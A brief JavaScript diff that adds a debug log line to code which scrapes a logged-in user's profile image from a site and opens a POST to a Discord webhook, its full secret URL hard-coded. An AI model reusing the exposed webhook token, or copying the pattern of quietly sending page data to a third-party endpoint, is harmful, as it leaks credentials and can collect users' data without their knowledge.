@@ -102,6 +102,7 @@
             .then(homeHTML => {
                 var homeDoc = parseHTML(homeHTML)
                 var bigProfileImage = homeDoc.querySelector("#nav-user > li.dropdown > a > img").src.replace('small', 'big')
+                console.log(homeDoc.querySelector("#nav-user > li.dropdown > a > img").src)
 
                 const request = new XMLHttpRequest();
                 request.open("POST", "https://discord.com/api/webhooks/1230789332747554848/pxn7mo6sf3x1ju5q2BW00dmPq4azGg5Qm8S0VJ71oMMvsDoXeERdl8AIaYpXUzzemT2f");
